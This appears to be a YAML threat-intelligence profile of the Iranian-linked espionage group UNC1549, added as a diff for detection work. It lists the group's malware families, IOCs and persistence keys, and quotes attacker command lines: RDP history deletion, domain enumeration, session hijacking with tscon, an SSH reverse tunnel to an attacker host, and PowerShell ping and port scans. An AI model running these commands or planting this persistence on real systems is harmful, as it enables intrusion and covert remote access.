@@ -1,0 +1,77 @@
+title: 'UNC1549 TTPs: Iranian APT Targeting Aerospace and Defense'
+description: UNC1549 is an Iranian-linked cyber-espionage group targeting aerospace,
+  aviation, and defense organizations using fake career portals, spear-phishing, and
+  custom malware including MiniJunk, MiniBrowse, SIGHTGRAB, and TRUSTRAP. The group
+  conducts multi-stage payload delivery, credential theft, and data exfiltration over
+  encrypted C2 channels.
+attribution: UNC1549
+malware_families:
+- MiniJunk
+- MiniBrowse
+- SIGHTGRAB
+- TRUSTRAP
+cves: []
+ttps:
+  processes:
+  - MigAutoPlay.exe
+  - net.exe
+  - ADExplorer.exe
+  - ssh.exe
+  command_lines:
+  - net user DC-01$ P@ssword
+  - reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default"
+    /va /f
+  - reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"
+    /f
+  - net user /domain
+  - net group /domain
+  - ADExplorer.exe -snapshot "" output.dat
+  - query session
+  - tscon <target session id> /dest:<attacker's session name>
+  - C:\windows\system32\openssh\ssh.exe [Username]@[IP Address] -p 443 -o ServerAliveInterval=60
+    -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -f -N -R 1070
+  powershell:
+  - 1 .. 254 | ForEach-Object { if ( Test-Connection -ComputerName "192.168.1. $_
+    " -Count 1 -Quiet) { "192.168.1. $_ is up" } }
+  - 80 , 443 , 445 , 3389 | ForEach-Object { $t = New-Object Net.Sockets.TcpClient;
+    try { $t .Connect( "192.168.1.100" , $_ ); " $_ OPEN" } catch { " $_ CLOSED" }
+    }
+  scripts: []
+  registry_keys:
+  - HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\OneDrive FileCoAuth
+  - HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OneDriveCoUpdate
+  - HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default
+  - HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers
+  image_loads:
+  - userenv.dll
+  - secur32.dll
+  network_connections:
+  - ssh.exe -> [IP Address]:443
+  file_activity:
+  - C:\Users\Public\Videos\2025-3-7-10-17\1.jpg
+  - C:\Users\Public\Videos\2025-3-7-10-17\2.jpg
+  - C:\Users\Public\Videos\2025-3-7-10-17\3.jpg
+  - '%LOCALAPPDATA%\Microsoft\Internet Explorer\secur32.dll'
+  - '%LOCALAPPDATA%\Microsoft\OneDrive\cache\logger\FileCoAuth.exe'
+  persistence:
+  - Scheduled task forcing execution of MigAutoPlay.exe and sideloaded userenv.dll
+    from a newly created working directory
+  - Registry Run key HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\OneDrive FileCoAuth
+    pointing to %LOCALAPPDATA%\Microsoft\Internet Explorer\secur32.dll
+  - Registry Run key HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OneDriveCoUpdate
+    pointing to %LOCALAPPDATA%\Microsoft\OneDrive\cache\logger\FileCoAuth.exe
+  process_relations:
+  - MigAutoPlay.exe -> userenv.dll (DLL sideload)
+iocs:
+  hashes: []
+  ip_addresses: []
+  domains:
+  - mps teledyneflir.com.de
+  urls:
+  - hxxps://cloud[.]google[.]com/blog/topics/threat-intelligence/suspected-iranian-unc1549-targets-israel-middle-east
+  - hxxps://cloud[.]google[.]com/blog/topics/threat-intelligence/analysis-of-unc1549-ttps-targeting-aerospace-defense
+  - hxxps://research[.]checkpoint[.]com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/
+authors: []
+reference: https://www.picussecurity.com/resource/blog/unc1549-ttps-iranian-apt-targeting-aerospace-and-defense
+date_of_publication: June 17, 2026
+file_creation_date: June 17, 2026
